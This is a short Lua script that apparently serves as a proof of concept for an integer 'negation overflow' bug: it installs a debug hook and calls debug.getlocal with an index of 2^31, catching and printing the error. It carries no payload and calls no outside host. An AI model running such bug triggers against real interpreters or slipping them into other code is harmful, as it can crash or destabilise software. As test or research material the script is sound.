function vulnerableFunction()
    local a = 1
    print("Inside vulnerable function")
end

-- Trigger to invoke the debug functionality to access local variables
function trigger()
    debug.sethook(function()
        -- Attempt to exploit the negation overflow by using a value that could cause overflow
        local status, err = pcall(debug.getlocal, 2, 2^31)
        if not status then
            print("Error caught:", err)
        end
    end, "c")
    
    vulnerableFunction() -- Call the function to have local variables to access
end

trigger()
